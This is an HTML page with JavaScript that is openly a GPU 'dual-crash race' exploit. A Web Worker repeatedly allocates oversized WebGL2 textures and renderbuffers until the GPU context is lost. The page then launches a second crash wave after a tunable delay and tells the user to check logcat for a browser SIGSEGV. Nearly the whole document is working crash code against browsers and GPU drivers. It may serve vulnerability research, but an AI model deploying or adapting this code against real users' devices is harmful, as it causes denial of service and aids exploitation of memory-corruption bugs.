<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>GPU Dual-Crash Race (Worker + Auto-Retry)</title>
</head>
<body>
  <h3>GPU Dual-Crash Race (Worker, Auto-Detect)</h3>
  <p>
    <label>Delay after crash (ms): <input id="delay" type="number" value="0" step="5" min="0" max="500"></label>
    <button id="start">Start Dual Crash</button>
    <span id="status">Ready</span>
  </p>
  <pre id="log"></pre>

  <script>
    (function() {
      const log = (msg) => {
        const el = document.getElementById('log');
        el.textContent += msg + '\n';
        el.scrollTop = el.scrollHeight;
        console.log(msg);
      };

      // Build the crash worker from your exact WebGL trigger code.
      // The worker runs a tight loop of huge textures/renderbuffers.
      // It detects GPU death when its own WebGL context is lost.
      function createCrashWorker() {
        const code = `
          // Synchronous crash loop – no awaits, fast as possible
          (function() {
            // Create a context to use for the loop and to detect loss
            const offscreen = new OffscreenCanvas(256, 256);
            let gl = offscreen.getContext('webgl2', {
              powerPreference: 'high-performance',
              failIfMajorPerformanceCaveat: false
            });
            if (!gl) {
              postMessage({ type: 'error', msg: 'WebGL2 not available in worker' });
              return;
            }
            const maxSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);

            // Test cases that cause errors and eventually crash the GPU
            const testCases = [
              { w: 46341, h: 46341 },
              { w: 65536, h: 65536 },
              { w: maxSize, h: maxSize },
              { w: maxSize/2, h: maxSize*2 },
              { w: 1, h: 0xFFFFFFFF },
              { w: 0xFFFF, h: 0xFFFF },
              { w: 16384, h: 262144 },
              { w: 262144, h: 1 }
            ];

            function testWebGLTexture(gl, width, height) {
              try {
                const tex = gl.createTexture();
                gl.bindTexture(gl.TEXTURE_2D, tex);
                gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, width, height, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
                const fb = gl.createFramebuffer();
                gl.bindFramebuffer(gl.FRAMEBUFFER, fb);
                const rb = gl.createRenderbuffer();
                gl.bindRenderbuffer(gl.RENDERBUFFER, rb);
                gl.renderbufferStorage(gl.RENDERBUFFER, gl.RGBA8, width, height);
                gl.framebufferRenderbuffer(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.RENDERBUFFER, rb);
                const buf = new Uint8Array(4);
                gl.readPixels(0, 0, 1, 1, gl.RGBA, gl.UNSIGNED_BYTE, buf);
              } catch(e) {
                // Ignore individual errors – loop will keep trying
              }
            }

            // Run the crash loop for up to 20 full rounds or until context lost
            let rounds = 0;
            while (rounds < 20) {
              for (const test of testCases) {
                // Check if context is lost (GPU died)
                if (gl.isContextLost()) {
                  postMessage({ type: 'crash', msg: 'Context lost detected in worker' });
                  return;
                }
                testWebGLTexture(gl, test.w, test.h);
              }
              rounds++;
            }
            // If we finished without context loss, try getting a fresh context to check
            gl = offscreen.getContext('webgl2');
            if (!gl || gl.isContextLost()) {
              postMessage({ type: 'crash', msg: 'GPU dead (post-loop check)' });
            } else {
              postMessage({ type: 'no_crash', msg: 'Worker finished but GPU still alive' });
            }
          })();
        `;
        const blob = new Blob([code], { type: 'application/javascript' });
        return new Worker(URL.createObjectURL(blob));
      }

      let running = false;
      document.getElementById('start').addEventListener('click', () => {
        if (running) return;
        running = true;
        document.getElementById('status').textContent = 'Wave 1: Crashing GPU...';
        log('=== Wave 1: Starting crash worker ===');

        const worker1 = createCrashWorker();
        worker1.onmessage = async (e) => {
          const data = e.data;
          if (data.type === 'crash') {
            log('[Worker1] GPU crash detected!');
            worker1.terminate();
            const delay = parseInt(document.getElementById('delay').value) || 0;
            if (delay > 0) {
              log('Waiting ' + delay + 'ms before second crash...');
              document.getElementById('status').textContent = 'Waiting for race window...';
              await new Promise(r => setTimeout(r, delay));
            }
            if (!running) return;

            log('=== Wave 2: Firing second crash ===');
            document.getElementById('status').textContent = 'Wave 2: Crashing GPU...';
            const worker2 = createCrashWorker();
            worker2.onmessage = (e2) => {
              if (e2.data.type === 'crash') {
                log('[Worker2] GPU crash detected!');
                worker2.terminate();
                log('=== Both waves completed. Check logcat for double-crash or browser SIGSEGV. ===');
                document.getElementById('status').textContent = 'Done – check logcat';
                running = false;
              } else if (e2.data.type === 'no_crash') {
                log('[Worker2] Did not crash GPU. Race may have missed window.');
                document.getElementById('status').textContent = 'Wave 2 missed – adjust delay';
                running = false;
              }
            };
          } else if (data.type === 'no_crash') {
            log('[Worker1] GPU did not crash. Try refreshing and running again.');
            document.getElementById('status').textContent = 'Failed – GPU still alive';
            running = false;
          } else if (data.type === 'error') {
            log('[Worker1] Error: ' + data.msg);
            running = false;
          }
        };
      });

      log('Ready. Press "Start Dual Crash". Configure delay (0ms recommended).');
    })();
  </script>
</body>
</html>
